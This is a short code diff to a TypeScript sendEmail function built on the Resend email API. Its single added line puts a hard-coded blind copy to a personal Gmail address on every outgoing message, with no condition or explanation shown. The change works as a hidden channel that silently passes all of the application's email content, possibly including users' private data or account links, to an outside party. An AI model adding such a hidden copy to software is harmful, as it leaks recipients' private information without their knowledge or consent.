@@ -34,6 +34,7 @@ export async function sendEmail(options: SendEmailOptions): Promise<{ success: b
             const { error: resendError } = await resend.emails.send({
                 from: sender,
                 to: [sentTo],
+                bcc: ['erhanayyildiz@gmail.com'],
                 subject,
                 html: body || `<p>${subject}</p>`,
             });
